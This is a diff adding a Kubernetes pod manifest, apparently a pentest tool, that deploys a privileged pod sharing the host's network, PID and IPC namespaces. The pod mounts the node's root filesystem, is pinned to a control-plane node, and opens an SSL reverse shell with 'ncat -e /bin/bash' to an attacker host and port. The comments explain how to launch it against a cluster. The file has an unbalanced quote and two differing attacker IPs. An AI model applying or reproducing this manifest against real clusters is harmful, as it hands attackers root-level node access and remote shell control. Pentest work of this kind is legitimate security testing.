@@ -1,0 +1,28 @@
+#HOST="10.0.4.208" PORT="3116" envsubst < everything-allowed-revshell-pod.yaml | kubectl apply -f -
+#HOST and PORT are remote attacker machine where "ncat --ssl -vlp 3116" is running in the attacker Machine.
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-revshell-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: raesene/ncat
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ HOST="10.0.2.208";PORT="3116";ncat --ssl $HOST $PORT -e /bin/bash;" ]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+  nodeName: cap-proj-1 # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
